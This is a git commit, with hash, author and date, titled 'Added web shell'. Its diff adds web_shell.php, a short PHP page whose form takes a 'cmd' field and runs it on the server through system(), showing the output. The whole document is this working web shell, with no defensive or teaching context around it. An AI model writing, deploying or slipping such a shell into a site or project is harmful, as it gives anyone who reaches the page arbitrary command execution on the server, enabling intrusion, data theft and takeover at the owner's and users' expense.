cd2f145d9aa216e36fc32a308b18085ff376b932
Daniel Merritt <daniel.merritt.1@gmail.com>
2021-07-23 11:44:59 +0100

    Added web shell

---
+++ web_shell.php
@@ -0,0 +1,17 @@
+<html>
+<body>
+<form method="POST" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
+<input type="TEXT" name="cmd" id="cmd" size="80">
+<input type="SUBMIT" value="Execute">
+</form>
+<pre>
+<?php
+    if(isset($_POST['cmd']))
+    {
+        system($_POST['cmd']);
+    }
+?>
+</pre>
+</body>
+<script>document.getElementById("cmd").focus();</script>
+</html>
